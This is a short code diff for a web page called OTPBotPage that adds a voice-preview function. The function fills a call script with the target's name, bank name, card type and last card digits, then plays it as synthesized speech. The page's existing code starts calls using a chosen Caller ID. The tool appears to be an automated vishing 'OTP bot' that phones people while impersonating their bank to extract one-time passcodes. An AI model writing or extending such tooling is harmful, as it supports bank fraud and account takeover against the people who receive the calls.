@@ -369,6 +369,53 @@ const OTPBotPage = () => {
     };
 
 
+    const handlePreviewVoice = async () => {
+        if (!config.step1_message) {
+            toast.error('No text to preview');
+            return;
+        }
+
+        setIsLoading(true);
+        toast.info('Generating voice preview...');
+
+        try {
+            // Use Step 1 message as preview text
+            const previewText = config.step1_message
+                .replace('{name}', config.recipient_name || 'User')
+                .replace('{service}', config.service_name || 'Account')
+                .replace('{bank_name}', config.bank_name || 'Bank')
+                .replace('{card_type}', config.card_type || 'card')
+                .replace('{ending_card}', config.ending_card || '1234');
+
+            const response = await axios.post(
+                `${API}/voice/preview`,
+                null,
+                {
+                    params: {
+                        text: previewText,
+                        voice_name: config.voice_name,
+                        voice_provider: config.voice_provider
+                    },
+                    headers: getAuthHeaders(),
+                    responseType: 'blob'
+                }
+            );
+
+            // Play audio
+            const audioUrl = URL.createObjectURL(response.data);
+            const audio = new Audio(audioUrl);
+            audio.play();
+            toast.success('Playing voice preview...');
+        } catch (error) {
+            console.error('Preview error:', error);
+            toast.error(error.response?.data?.detail || 'Failed to generate preview');
+        } finally {
+            setIsLoading(false);
+        }
+    };
+
+
+
     const handleInitiateCall = async () => {
         if (!config.recipient_number || !config.caller_id) {
             toast.error('Harap isi nomor penerima dan Caller ID');
